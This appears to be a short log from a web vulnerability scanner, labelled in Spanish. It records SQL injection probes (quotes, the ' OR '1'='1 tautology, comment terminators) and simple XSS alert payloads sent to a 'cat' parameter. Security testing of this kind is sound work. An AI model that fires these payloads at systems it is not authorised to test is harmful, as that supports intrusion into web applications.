[SQLi] Parámetro: cat | Payload: '
[SQLi] Parámetro: cat | Payload: "
[SQLi] Parámetro: cat | Payload: ' OR '1'='1
[SQLi] Parámetro: cat | Payload: '--
[SQLi] Parámetro: cat | Payload: '#
[SQLi] Parámetro: cat | Payload: <script>alert('XSS')</script>
[XSS] Parámetro: cat | Payload: <script>alert('XSS')</script>
[SQLi] Parámetro: cat | Payload: <img src=x onerror=alert('XSS')>
[XSS] Parámetro: cat | Payload: <img src=x onerror=alert('XSS')>
